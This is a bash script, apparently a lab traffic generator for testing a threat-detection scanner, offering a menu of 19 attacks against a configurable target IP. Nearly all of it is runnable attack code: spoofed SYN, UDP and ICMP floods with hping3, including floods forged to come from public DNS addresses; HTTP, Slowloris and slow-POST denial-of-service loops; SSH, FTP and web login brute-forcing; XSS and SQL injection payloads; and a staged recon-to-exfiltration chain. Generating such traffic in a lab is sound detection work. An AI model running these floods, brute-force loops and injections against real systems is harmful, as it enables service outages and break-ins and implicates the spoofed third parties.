#!/usr/bin/env bash

# ============================
# Threat-Hunter Interactive Attack Lab
# ============================

# Change these if needed
TARGET_IP="172.21.236.19"   # your machine / WSL IP
HTTP_PORT="8080"
SSH_PORT="22"
FTP_PORT="21"
COUNT="200"
LOG_FILE="attack_telemetry.csv"

# Single hardcoded spoofed attacker IP (used for ALL hping3 attacks)
SPOOF_IP="10.10.255.1"

# init telemetry header
if [[ ! -f "$LOG_FILE" ]]; then
  echo "timestamp,attack_name,target_ip,port,count,duration_sec,notes" >> "$LOG_FILE"
fi

log_attack() {
  local attack_name="$1"
  local port="$2"
  local count="$3"
  local start_ts="$4"
  local end_ts="$5"
  local notes="$6"
  local dur=$((end_ts - start_ts))
  echo "$(date -Iseconds),${attack_name},${TARGET_IP},${port},${count},${dur},${notes}" >> "$LOG_FILE"
}

banner() {
  echo
  echo "=================================================="
  echo " Target: ${TARGET_IP} | HTTP_PORT: ${HTTP_PORT} | COUNT: ${COUNT}"
  echo " Attack: $1"
  echo " Spoofed attacker IP (hping3): ${SPOOF_IP}"
  echo "=================================================="
}

botnet_sim() {
  banner "Botnet simulation (Bot)"
  local start_ts end_ts
  start_ts=$(date +%s)
  # single spoofed IP, many SYNs to simulate a bot controller/agent
  for i in $(seq 1 5); do
    sudo hping3 -S -a "$SPOOF_IP" "$TARGET_IP" -p "$HTTP_PORT" --fast -c "$COUNT" &
  done
  wait
  end_ts=$(date +%s)
  log_attack "botnet" "$HTTP_PORT" "$COUNT" "$start_ts" "$end_ts" "5 bursts from spoofed $SPOOF_IP"
}

ddos_hoic() {
  banner "DDOS attack-HOIC (HTTP-like flood)"
  local start_ts end_ts
  echo "[*] Start a HTTP server first if needed: python3 -m http.server ${HTTP_PORT}"
  start_ts=$(date +%s)
  # curl cannot spoof IP, but this is mainly for ML feature shape
  for i in $(seq 1 "$COUNT"); do
    curl -s "http://${TARGET_IP}:${HTTP_PORT}/?id=${RANDOM}" > /dev/null &
  done
  wait
  end_ts=$(date +%s)
  log_attack "ddos_hoic" "$HTTP_PORT" "$COUNT" "$start_ts" "$end_ts" "HTTP GET flood (real src IP)"
}

ddos_loic_http() {
  banner "DDoS attacks-LOIC-HTTP (SYN flood to HTTP port)"
  local start_ts end_ts
  start_ts=$(date +%s)
  sudo hping3 -S -a "$SPOOF_IP" "$TARGET_IP" -p "$HTTP_PORT" --flood &
  HPID=$!
  echo "[*] Press Ctrl+C to stop the flood..."
  trap "kill $HPID 2>/dev/null" INT
  wait $HPID 2>/dev/null
  end_ts=$(date +%s)
  log_attack "ddos_loic_http" "$HTTP_PORT" "$COUNT" "$start_ts" "$end_ts" "hping3 SYN flood spoofed $SPOOF_IP"
}

ddos_loic_udp() {
  banner "DDOS attack-LOIC-UDP (UDP flood)"
  local start_ts end_ts
  start_ts=$(date +%s)
  sudo hping3 --udp -a "$SPOOF_IP" "$TARGET_IP" -p "$HTTP_PORT" --flood &
  HPID=$!
  echo "[*] Press Ctrl+C to stop the flood..."
  trap "kill $HPID 2>/dev/null" INT
  wait $HPID 2>/dev/null
  end_ts=$(date +%s)
  log_attack "ddos_loic_udp" "$HTTP_PORT" "$COUNT" "$start_ts" "$end_ts" "UDP flood spoofed $SPOOF_IP"
}

dos_goldeneye() {
  banner "DoS attacks-GoldenEye"
  local start_ts end_ts
  echo "[*] GoldenEye: HTTP flood with randomized payloads to exhaust server resources"
  start_ts=$(date +%s)
  for i in $(seq 1 "$COUNT"); do
    # Multiple requests per iteration to increase load
    for j in $(seq 1 5); do
      curl -s -H "Connection: keep-alive" \
           -H "User-Agent: Mozilla/${RANDOM}" \
           -H "Accept-Language: en-US,en;q=0.${RANDOM}" \
           "http://${TARGET_IP}:${HTTP_PORT}/$(head -c 12 /dev/urandom | base64 | tr -d '=+/' | head -c 12)" > /dev/null &
    done
  done
  wait
  end_ts=$(date +%s)
  log_attack "dos_goldeneye" "$HTTP_PORT" "$((COUNT*5))" "$start_ts" "$end_ts" "keep-alive HTTP flood (real src IP)"
}

dos_hulk() {
  banner "DoS attacks-Hulk"
  local start_ts end_ts
  echo "[*] Hulk: Massive HTTP GET flood with obfuscated URLs"
  start_ts=$(date +%s)
  for i in $(seq 1 "$COUNT"); do
    # Multiple concurrent requests with random URLs and headers
    for j in $(seq 1 3); do
      curl -s -X GET \
           -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; ${RANDOM})" \
           -H "Cache-Control: no-cache" \
           -H "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" \
           "http://${TARGET_IP}:${HTTP_PORT}/$(head -c 16 /dev/urandom | base64 | tr -d '=+/' | head -c 16)?q=${RANDOM}" > /dev/null 2>&1 &
    done
  done
  wait
  end_ts=$(date +%s)
  log_attack "dos_hulk" "$HTTP_PORT" "$((COUNT*3))" "$start_ts" "$end_ts" "random URL/header flood (real src IP)"
}

dos_slowloris() {
  banner "DoS attacks-Slowloris"
  local start_ts end_ts
  echo "[*] Slowloris: Maintains many open HTTP connections by slowly sending partial headers"
  start_ts=$(date +%s)
  for i in $(seq 1 100); do
    {
      exec 3<>/dev/tcp/"$TARGET_IP"/"$HTTP_PORT" 2>/dev/null || exit
      printf "GET /%s HTTP/1.1\r\nHost: %s\r\n" "$RANDOM" "$TARGET_IP" >&3
      for j in $(seq 1 30); do
        printf "X-Custom-Header-%s: %s\r\n" "$j" "$RANDOM" >&3
        sleep 5
      done
      printf "\r\n" >&3
      exec 3>&-
    } &
  done
  echo "[*] Slowloris connections started (will terminate in ~2.5 min per connection)"
  end_ts=$(date +%s)
  log_attack "dos_slowloris" "$HTTP_PORT" "100" "$start_ts" "$end_ts" "slow header connections (real src IP)"
}

dos_slowhttptest() {
  banner "DoS attacks-SlowHTTPTest"
  local start_ts end_ts
  echo "[*] SlowHTTPTest: Sends POST with large Content-Length, then drips data slowly"
  start_ts=$(date +%s)
  for i in $(seq 1 100); do
    {
      exec 3<>/dev/tcp/"$TARGET_IP"/"$HTTP_PORT" 2>/dev/null || exit
      printf "POST /upload HTTP/1.1\r\nHost: %s\r\nContent-Length: 1000000\r\n" "$TARGET_IP" >&3
      printf "Content-Type: application/x-www-form-urlencoded\r\n\r\n" >&3
      for j in $(seq 1 50); do
        printf "data%s=%s&" "$j" "$RANDOM" >&3
        sleep 3
      done
      exec 3>&-
    } &
  done
  echo "[*] SlowHTTP POST connections started (will complete in ~2.5 min)"
  end_ts=$(date +%s)
  log_attack "dos_slowhttptest" "$HTTP_PORT" "100" "$start_ts" "$end_ts" "slow POST body (real src IP)"
}

syn_flood() {
  banner "Generic SYN flood (spoofed)"
  local start_ts end_ts
  start_ts=$(date +%s)
  sudo hping3 -S -a "$SPOOF_IP" "$TARGET_IP" -p "$HTTP_PORT" --flood &
  HPID=$!
  echo "[*] Press Ctrl+C to stop the flood..."
  trap "kill $HPID 2>/dev/null" INT
  wait $HPID 2>/dev/null
  end_ts=$(date +%s)
  log_attack "syn_flood" "$HTTP_PORT" "$COUNT" "$start_ts" "$end_ts" "SYN flood spoofed $SPOOF_IP"
}

icmp_flood() {
  banner "ICMP flood (spoofed)"
  local start_ts end_ts
  start_ts=$(date +%s)
  sudo hping3 --icmp -a "$SPOOF_IP" "$TARGET_IP" --flood &
  HPID=$!
  echo "[*] Press Ctrl+C to stop the flood..."
  trap "kill $HPID 2>/dev/null" INT
  wait $HPID 2>/dev/null
  end_ts=$(date +%s)
  log_attack "icmp_flood" "0" "$COUNT" "$start_ts" "$end_ts" "ICMP flood spoofed $SPOOF_IP"
}

port_scan() {
  banner "Port scan (recon)"
  local start_ts end_ts
  start_ts=$(date +%s)
  nmap -sS -p 1-1000 "$TARGET_IP"
  end_ts=$(date +%s)
  log_attack "port_scan" "1-1000" "0" "$start_ts" "$end_ts" "nmap -sS (real src IP)"
}

ssh_bruteforce() {
  banner "SSH-Bruteforce (approx)"
  local start_ts end_ts
  echo "[*] Requires SSH server on ${TARGET_IP}:${SSH_PORT}"
  echo "[*] SSH Bruteforce: Rapid authentication attempts with various credentials"
  start_ts=$(date +%s)
  for i in $(seq 1 100); do
    # Use common usernames and rapid fire attempts
    ssh -o BatchMode=yes -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
        "$(shuf -n1 -e admin root user administrator guest ftpuser test)" @"$TARGET_IP" -p "$SSH_PORT" "exit" 2>/dev/null &
  done
  wait
  end_ts=$(date +%s)
  log_attack "ssh_bruteforce" "$SSH_PORT" "100" "$start_ts" "$end_ts" "SSH auth attempts (real src IP)"
}

ftp_bruteforce() {
  banner "FTP-BruteForce (approx)"
  local start_ts end_ts
  echo "[*] Requires FTP server on ${TARGET_IP}:${FTP_PORT}"
  start_ts=$(date +%s)
  for i in $(seq 1 50); do
    printf "USER fakeuser%s\r\nPASS fakepass%s\r\n" "$i" "$i" | nc "$TARGET_IP" "$FTP_PORT" >/dev/null 2>&1 &
  done
  wait
  end_ts=$(date +%s)
  log_attack "ftp_bruteforce" "$FTP_PORT" "50" "$start_ts" "$end_ts" "fake FTP logins (real src IP)"
}

web_bruteforce() {
  banner "Brute Force -Web"
  local start_ts end_ts
  start_ts=$(date +%s)
  for i in $(seq 1 "$COUNT"); do
    curl -s -X POST "http://${TARGET_IP}:${HTTP_PORT}/login" \
      -d "user=admin&pass=guess${i}" > /dev/null &
  done
  wait
  end_ts=$(date +%s)
  log_attack "bruteforce_web" "$HTTP_PORT" "$COUNT" "$start_ts" "$end_ts" "HTTP /login brute-force (real src IP)"
}

web_xss() {
  banner "Brute Force -XSS / XSS-style"
  local start_ts end_ts
  start_ts=$(date +%s)
  for i in $(seq 1 "$COUNT"); do
    curl -s "http://${TARGET_IP}:${HTTP_PORT}/search?q=<script>alert(${RANDOM})</script>" > /dev/null &
  done
  wait
  end_ts=$(date +%s)
  log_attack "xss" "$HTTP_PORT" "$COUNT" "$start_ts" "$end_ts" "XSS payloads (real src IP)"
}

sql_injection() {
  banner "SQL Injection-style"
  local start_ts end_ts
  start_ts=$(date +%s)
  for i in $(seq 1 "$COUNT"); do
    curl -s "http://${TARGET_IP}:${HTTP_PORT}/item?id=1%20UNION%20SELECT%20username,password%20FROM%20users--" > /dev/null &
  done
  wait
  end_ts=$(date +%s)
  log_attack "sql_injection" "$HTTP_PORT" "$COUNT" "$start_ts" "$end_ts" "UNION SELECT payloads (real src IP)"
}

infiltration() {
  banner "Infilteration (low-and-slow exfil style)"
  local start_ts end_ts
  echo "[*] Infiltration: Mimics data exfiltration with low-rate encrypted POST requests"
  start_ts=$(date +%s)
  for i in $(seq 1 150); do
    # Simulate encrypted data exfiltration with varied timing
    curl -s -X POST "http://${TARGET_IP}:${HTTP_PORT}/api/sync" \
      -H "Content-Type: application/octet-stream" \
      -H "X-Session-Token: $(head -c 16 /dev/urandom | base64 | tr -d '=+/')" \
      --data-binary "$(head -c $((32 + RANDOM % 512)) /dev/urandom | base64)" > /dev/null &
    sleep $((1 + RANDOM % 3))
  done
  wait
  end_ts=$(date +%s)
  log_attack "infilteration" "$HTTP_PORT" "150" "$start_ts" "$end_ts" "low-rate data exfil (real src IP)"
}

multi_stage_attack_chain() {
  banner "Multi-Stage Attack Chain (Recon -> Credential -> DoS -> Infiltration)"
  local start_ts end_ts
  echo "[*] This simulates a coordinated multi-phase attack that will trigger attack chain detection"
  echo "[*] Phase 1: Reconnaissance (Port Scan)"
  echo "[*] Phase 2: Credential Attack (SSH Bruteforce)"
  echo "[*] Phase 3: DoS Attack (GoldenEye)"
  echo "[*] Phase 4: Data Exfiltration (Infiltration)"
  echo ""
  
  start_ts=$(date +%s)
  
  # Phase 1: Reconnaissance - Port Scan
  echo "[Phase 1/4] Starting reconnaissance port scan..."
  nmap -sS -p 1-1000 "$TARGET_IP" > /dev/null 2>&1 &
  sleep 3
  
  # Phase 2: Credential Attack - SSH Bruteforce (runs concurrently with port scan)
  echo "[Phase 2/4] Starting SSH bruteforce attempts..."
  for i in $(seq 1 50); do
    ssh -o BatchMode=yes -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
        "$(shuf -n1 -e admin root user administrator guest ftpuser test)" @"$TARGET_IP" -p "$SSH_PORT" "exit" 2>/dev/null &
  done
  sleep 2
  
  # Phase 3: DoS Attack - GoldenEye (runs concurrently)
  echo "[Phase 3/4] Starting DoS attack (GoldenEye)..."
  for i in $(seq 1 30); do
    for j in $(seq 1 3); do
      curl -s -H "Connection: keep-alive" \
           -H "User-Agent: Mozilla/${RANDOM}" \
           -H "Accept-Language: en-US,en;q=0.${RANDOM}" \
           "http://${TARGET_IP}:${HTTP_PORT}/$(head -c 12 /dev/urandom | base64 | tr -d '=+/' | head -c 12)" > /dev/null &
    done
  done
  sleep 2
  
  # Phase 4: Infiltration - Data Exfiltration (runs concurrently)
  echo "[Phase 4/4] Starting data exfiltration (infiltration)..."
  for i in $(seq 1 50); do
    curl -s -X POST "http://${TARGET_IP}:${HTTP_PORT}/api/sync" \
      -H "Content-Type: application/octet-stream" \
      -H "X-Session-Token: $(head -c 16 /dev/urandom | base64 | tr -d '=+/')" \
      --data-binary "$(head -c $((32 + RANDOM % 256)) /dev/urandom | base64)" > /dev/null &
    sleep $((1 + RANDOM % 2))
  done
  
  echo "[*] All attack phases launched. Waiting for completion..."
  wait
  end_ts=$(date +%s)
  log_attack "multi_stage_chain" "multiple" "0" "$start_ts" "$end_ts" "Multi-phase: Recon+Brute+DoS+Exfil (real src IP)"
  echo "[*] Multi-stage attack chain completed. Check scanner for attack chain detection!"
}

spoofed_whitelist_attack() {
  banner "Spoofed Whitelist IP Attack Test"
  local start_ts end_ts
  echo "[*] This attack spoofs whitelisted IPs (DNS servers) to test anti-spoofing detection"
  echo "[*] Scanner should detect these as spoofed attacks despite whitelist protection"
  echo "[*] Testing: Rate limiting, TTL variance, and port heuristics"
  echo ""
  
  # List of whitelisted IPs to spoof
  WHITELIST_IPS=("8.8.8.8" "8.8.4.4" "1.1.1.1" "1.0.0.1" "9.9.9.9")
  
  start_ts=$(date +%s)
  
  echo "[*] Phase 1: SYN flood spoofed from Google DNS (8.8.8.8)..."
  sudo hping3 -S -a "8.8.8.8" "$TARGET_IP" -p "$HTTP_PORT" --fast -c 200 &
  
  sleep 2
  
  echo "[*] Phase 2: ICMP flood spoofed from Cloudflare DNS (1.1.1.1)..."
  sudo hping3 --icmp -a "1.1.1.1" "$TARGET_IP" --fast -c 100 &
  
  sleep 2
  
  echo "[*] Phase 3: UDP flood spoofed from Quad9 DNS (9.9.9.9)..."
  sudo hping3 --udp -a "9.9.9.9" "$TARGET_IP" -p "$HTTP_PORT" --fast -c 150 &
  
  sleep 2
  
  echo "[*] Phase 4: High-rate SYN flood from Google DNS (8.8.8.8) - testing rate limit..."
  sudo hping3 -S -a "8.8.8.8" "$TARGET_IP" -p "$HTTP_PORT" --flood &
  HPID=$!
  echo "[*] Flood running for 10 seconds (testing rate limit detection)..."
  sleep 10
  kill $HPID 2>/dev/null
  
  sleep 2
  
  echo "[*] Phase 5: Random whitelisted IPs with varying TTLs (testing TTL variance)..."
  for spoof_ip in "${WHITELIST_IPS[@]}"; do
    # Use random TTL values to trigger variance detection
    sudo hping3 -S -a "$spoof_ip" "$TARGET_IP" -p "$HTTP_PORT" --ttl $((30 + RANDOM % 50)) --fast -c 50 &
  done
  
  wait
  end_ts=$(date +%s)
  log_attack "spoofed_whitelist" "$HTTP_PORT" "0" "$start_ts" "$end_ts" "Spoofed attacks from whitelisted IPs (8.8.8.8, 1.1.1.1, 9.9.9.9)"
  echo "[*] Spoofed whitelist attack completed!"
  echo "[*] Check scanner logs for spoofing detection messages"
  echo "[*] Scanner should detect: rate limit violations, TTL variance, or port heuristics"
}

menu() {
  echo
  echo "========= Threat-Hunter Attack Menu ========="
  echo " Target: ${TARGET_IP} | HTTP_PORT: ${HTTP_PORT} | COUNT: ${COUNT}"
  echo " Telemetry log: ${LOG_FILE}"
  echo " Spoofed attacker IP (hping3): ${SPOOF_IP}"
  echo
  echo "  1) Botnet (Bot)"
  echo "  2) DDoS HOIC"
  echo "  3) DDoS LOIC HTTP"
  echo "  4) DDoS LOIC UDP"
  echo "  5) DoS GoldenEye"
  echo "  6) DoS Hulk"
  echo "  7) DoS Slowloris"
  echo "  8) DoS SlowHTTPTest"
  echo "  9) Generic SYN flood"
  echo " 10) ICMP flood"
  echo " 11) Port scan"
  echo " 12) SSH Bruteforce"
  echo " 13) FTP Bruteforce"
  echo " 14) Web Brute Force"
  echo " 15) Web XSS"
  echo " 16) SQL Injection"
  echo " 17) Infilteration"
  echo " 18) Multi-Stage Attack Chain (Recon+Brute+DoS+Exfil)"
  echo " 19) Spoofed Whitelist IP Attack Test (Anti-Spoofing Detection)"
  echo "  0) Exit"
  echo "============================================="
  read -rp "Select attack [0-19]: " choice
}

while true; do
  menu
  case "$choice" in
    1)  botnet_sim ;;
    2)  ddos_hoic ;;
    3)  ddos_loic_http ;;
    4)  ddos_loic_udp ;;
    5)  dos_goldeneye ;;
    6)  dos_hulk ;;
    7)  dos_slowloris ;;
    8)  dos_slowhttptest ;;
    9)  syn_flood ;;
    10) icmp_flood ;;
    11) port_scan ;;
    12) ssh_bruteforce ;;
    13) ftp_bruteforce ;;
    14) web_bruteforce ;;
    15) web_xss ;;
    16) sql_injection ;;
    17) infiltration ;;
    18) multi_stage_attack_chain ;;
    19) spoofed_whitelist_attack ;;
    0)  echo "Bye."; exit 0 ;;
    *)  echo "[!] Invalid choice." ;;
  esac
done

